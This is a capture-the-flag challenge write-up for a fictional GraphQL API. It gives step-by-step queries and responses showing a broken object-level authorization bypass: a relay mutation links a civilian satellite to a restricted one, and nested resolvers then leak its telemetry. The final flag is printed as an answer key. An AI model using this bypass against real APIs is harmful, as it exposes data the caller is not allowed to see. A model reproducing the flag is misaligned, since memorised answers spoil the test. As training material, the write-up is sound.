# Project Helios - The Orbital Relay

## Author
DeliverHellVeil

## Domain
Web Exploitation

## Difficulty
Medium

### Question Description

Astraeus Aerospace manages a constellation of civilian and classified military satellites. You are a university researcher with a basic Civilian account, authorized to launch and monitor weather CubeSats.

Astraeus is currently maneuvering its classified surveillance satellite, **HELIOS-4**. Your objective is to extract its encrypted downlink payload, despite lacking the military clearance required to query the satellite directly.

Investigate the GraphQL API, identify weaknesses in its authorization model, and find a way to route restricted telemetry through a satellite you control.

**Target Endpoint:** `http://api.astraeus.ctf/graphql`

**Authentication:** `Authorization: Bearer student_civilian_token`

**Tools recommended:** Altair, GraphQL Voyager, Burp Suite, or `curl`.

### Intended Solution

Begin by exploring the GraphQL API through introspection. Send the following request to retrieve the schema, including available types, fields, arguments, and descriptions.

```
POST /graphql HTTP/1.1
Host: api.astraeus.ctf
Authorization: Bearer student_civilian_token
Content-Type: application/json

{"query":"query { __schema { types { name description fields { name description args { name type { name } } } } } }"}
```

Load the returned schema into a GraphQL visualizer or inspect the JSON response manually. Identify the available queries and mutations, particularly `satelliteInfo`, `launchCubeSat`, `establishRelayConnection`, `relayConnections`, and `telemetryData`.

The description attached to the `Satellite` type reveals the intended security model:

> You can access telemetryData if: 1. You are the registered owner of this satellite, OR 2. You own a satellite that is currently relaying with this one.

This suggests that satellite relationships may provide an alternative path to restricted telemetry.

**Attempt Direct Access**

Attempt to retrieve HELIOS-4 telemetry directly through the root query:

```
query {
  satelliteInfo(id: "HELIOS-4") {
    telemetryData {
      rawData
    }
  }
}
```

The API responds with an authorization error:

```
{
  "errors": [
    {
      "message": "403: Forbidden - Military clearance required to view HELIOS-4 telemetry"
    }
  ]
}
```

The root resolver correctly checks the civilian account's permissions and denies direct access to the military satellite. An alternative route through the GraphQL object relationships is therefore required.

**Launch a Civilian Satellite**

To exploit the relay-based access rule, first create a satellite that belongs to your account using the `launchCubeSat` mutation:

```
mutation {
  launchCubeSat(designation: "MANIPAL-SAT-1") {
    id
    designation
  }
}
```

The API returns:

```
{
  "data": {
    "launchCubeSat": {
      "id": "CUBE-9921",
      "designation": "MANIPAL-SAT-1"
    }
  }
}
```

Record the returned satellite ID, `CUBE-9921`. This is the satellite you own and will use as the starting point for the relay connection.

**Establish an Unauthorized Relay Connection**

Next, investigate the `establishRelayConnection` mutation. The mutation links a source satellite to a target satellite.

Submit the following request to connect your civilian satellite to HELIOS-4:

```
mutation {
  establishRelayConnection(
    sourceSatId: "CUBE-9921",
    targetSatId: "HELIOS-4"
  ) {
    id
  }
}
```

The API responds successfully:

```
{
  "data": {
    "establishRelayConnection": {
      "id": "CUBE-9921"
    }
  }
}
```

This reveals a broken object-level authorization (BOLA) vulnerability. The mutation verifies that you own the source satellite but fails to verify whether you are authorized to connect to the target satellite.

As a result, a relationship is created between your civilian satellite and the restricted military satellite, bypassing the intended authorization boundary.

**Traverse the Graph to Retrieve Telemetry**

With the relay connection established, query your account's satellites and traverse the `relayConnections` relationship to reach HELIOS-4. Request its nested `telemetryData` fields:

```
query {
  me {
    mySatellites {
      designation
      relayConnections {
        designation
        telemetryData {
          sensorType
          rawData
        }
      }
    }
  }
}
```

The API returns telemetry from the connected satellites because the nested resolvers fail to re-check authorization for the target satellite and its telemetry.

This demonstrates an authorization flaw in GraphQL graph traversal: although the root query blocks direct access to HELIOS-4, the nested `relayConnections` and `telemetryData` resolvers trust the existing object relationship without independently verifying the user's permissions.

Inspect the returned JSON payload. The telemetry includes several sensor readings, such as Thermal, Radiation, Encrypted\_Uplink, and Gyroscope.

Locate the entry whose `sensorType` is `Encrypted_Uplink`. Its `rawData` field contains the flag:

```
{
  "sensorType": "Encrypted_Uplink",
  "rawData": "kernel{0rb1t4l_n3tw0rk_byp4ss_c0mpr0m1s3d}"
}
```

The flag confirms that the restricted military satellite's telemetry was successfully retrieved through the unauthorized relay connection.

### Flag

> `kernel{0rb1t4l_n3tw0rk_byp4ss_c0mpr0m1s3d}`